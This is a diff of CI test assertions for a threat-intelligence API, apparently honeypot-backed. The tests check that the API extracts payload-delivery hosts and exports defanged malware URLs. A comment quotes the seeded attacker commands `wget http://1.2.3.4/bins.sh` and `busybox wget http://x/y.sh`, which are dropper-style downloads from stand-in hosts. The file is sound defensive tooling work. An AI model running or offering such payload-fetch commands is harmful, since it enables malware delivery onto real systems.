@@ -242,6 +242,38 @@ jobs:
           # An unknown format must not become an unfiltered dump.
           assert "unknown format falls back to json" "200" "$(status "$PUB/iocs?format=xml")"
 
+          echo "--- payload delivery infrastructure ---"
+          # The seed runs `wget http://1.2.3.4/bins.sh` and
+          # `busybox wget http://x/y.sh`, so two hosts must fall out: one an
+          # address, one a name.
+          assert "200 payload-hosts" "200" "$(status "$PUB/payload-hosts")"
+          assert "extracts both delivery hosts" "2" "$(jq_get "$PUB/payload-hosts" '.total')"
+          assert "the busiest host first" "1.2.3.4" "$(jq_get "$PUB/payload-hosts" '.rows[0].host')"
+          assert "addresses are marked as such" "true" "$(jq_get "$PUB/payload-hosts" '.rows[0].is_ip')"
+          assert "hostnames are not" "false" \
+            "$(jq_get "$PUB/payload-hosts" '[.rows[] | select(.host == "x")] | .[0].is_ip')"
+          assert "carries the URLs it found" "true" \
+            "$(jq_get "$PUB/payload-hosts" '.rows[0].urls | any(contains("bins.sh"))')"
+          # A host must never appear with a path or scheme still attached.
+          assert "hosts are bare" "0" \
+            "$(jq_get "$PUB/payload-hosts" '[.rows[].host | select(test("/|:"))] | length')"
+
+          echo "--- payload URLs as exportable indicators ---"
+          assert "200 iocs?type=urls" "200" "$(status "$PUB/iocs?type=urls")"
+          assert "exports both URLs" "2" "$(jq_get "$PUB/iocs?type=urls" '.rows | length')"
+          # hxxp:// and bracketed dots: the convention for putting a live
+          # malware URL in a ticket without it becoming a link.
+          assert "defangs the scheme" "true" \
+            "$(jq_get "$PUB/iocs?type=urls&defang=1" '[.rows[].url] | all(startswith("hxxp://"))')"
+          assert "defangs the host dots" "true" \
+            "$(jq_get "$PUB/iocs?type=urls&defang=1" '[.rows[].url] | any(contains("1.2.3[.]4"))')"
+          assert "leaves the path alone" "true" \
+            "$(jq_get "$PUB/iocs?type=urls&defang=1" '[.rows[].url] | any(contains("bins.sh"))')"
+          assert "txt export of urls is pasteable" "true" \
+            "$(curl -fsS "$PUB/iocs?type=urls&format=txt" | grep -q '^http://1.2.3.4/bins.sh$' && echo true || echo false)"
+          assert "csv export names its columns" "true" \
+            "$(curl -fsS "$PUB/iocs?type=urls&format=csv" | grep -q '^url,host,first_seen,last_seen$' && echo true || echo false)"
+
           echo "--- k-anonymous password lookup ---"
           # sha256("123456") = 8d969eef6eca...  The seed uses it under two
           # usernames, so a real prefix must return a real hash.
